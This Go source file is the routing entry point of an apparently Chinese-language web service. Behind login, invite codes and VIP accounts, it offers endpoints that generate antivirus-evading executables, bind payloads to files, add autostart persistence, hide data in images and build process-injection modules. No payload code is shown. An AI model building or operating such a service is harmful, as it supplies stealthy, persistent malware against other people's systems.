package main

import (
	"github.com/gin-gonic/gin"
	"net/http"
	"web/admin"
	"web/cmd"
	"web/config"
	"web/testpackage"
	"web/user"
)

func main() {
	router := gin.Default()
	router.Use(testpackage.Cors()) //解决跨域问题
	// 处理multipart forms提交文件时默认的内存限制是32 MiB再砸
	// 可以通过下面的方式修改
	router.MaxMultipartMemory = 1 << 5 // 5 MiB
	router.Static("/static", "./static")
	router.Static("/img", "./getshell/img")
	router.Static("/shell", "./getshell") //生成的文件目录
	router.LoadHTMLGlob("templates/**/*")
	router.GET("/", func(c *gin.Context) { //访问首页（登录页面）
		c.HTML(http.StatusOK, "index.html", gin.H{})
	})
	router.GET("/reg", func(c *gin.Context) { //访问注册（注册页面）
		c.HTML(http.StatusOK, "reg.html", gin.H{})
	})
	router.GET("/center/user", testpackage.JWTAuthMiddleware(), user.Usertype) //访问用户页面
	router.Use(testpackage.Session("what"))
	fileUrl := router.Group("/api/file/")
	{
		fileUrl.POST("/bypassav", testpackage.JWTAuthMiddleware(), cmd.Upload)           //上传生成exe(简单免杀函数)
		fileUrl.POST("/binding", testpackage.JWTAuthMiddleware(), cmd.Binding)           //捆绑免杀函数
		fileUrl.POST("/addself", testpackage.JWTAuthMiddleware(), cmd.Addself)           //简单自启免杀
		fileUrl.POST("/encodeimg", testpackage.JWTAuthMiddleware(), cmd.Encodeimg)       //图片隐写功能
		fileUrl.POST("/injectbypass", testpackage.JWTAuthMiddleware(), cmd.InjectBypass) //进程注入生成模块
	}
	router.Use(testpackage.Session("what"))

	router.POST("/api/auth/reg", user.UserRag) //注册模块
	router.Use(testpackage.Session("what"))
	router.POST("/api/auth/login", user.Login) //登录模块
	router.GET("/api/auth/captcha", func(c *gin.Context) { //获取验证码
		testpackage.Captcha(c, 4)
	})
	router.POST("/api/auth/logout", testpackage.JWTAuthMiddleware(), func(c *gin.Context) { //用户注销
		username := c.MustGet("username").(string)
		tokenString, _ := testpackage.GenToken(username)
		c.SetCookie("Authorization", tokenString, -1, "/", config.HostName, false, true)
		c.JSON(http.StatusOK, gin.H{
			"static":  200,
			"message": "注销成功!",
			"url":     "/",
		})
		return
	})
	router.NoRoute(func(c *gin.Context) {
		c.String(http.StatusNotFound, "这里没有东西哦.")
	})
	adminurl := router.Group("/api/admin/")
	{
		adminurl.POST("/getkey", testpackage.JWTAuthMiddleware(), admin.Createkey) //生成邀请码
		adminurl.GET("/getinfo", testpackage.JWTAuthMiddleware(), admin.Select)    //查询
		adminurl.POST("/delkey", testpackage.JWTAuthMiddleware(), admin.Delidkey)  //删除邀请码

		adminurl.POST("/deluser", testpackage.JWTAuthMiddleware(), admin.Deliduser) //删除用户函数
		adminurl.POST("/delfile", testpackage.JWTAuthMiddleware(), admin.Delidfile) //删除用户函数
		adminurl.POST("/addvip", testpackage.JWTAuthMiddleware(), admin.Addvip)     //添加内测用户函数
		adminurl.POST("/delvip", testpackage.JWTAuthMiddleware(), admin.Delvip)     //删除内测用户函数
	}

	router.Run(config.Host + ":" + config.Port)
}
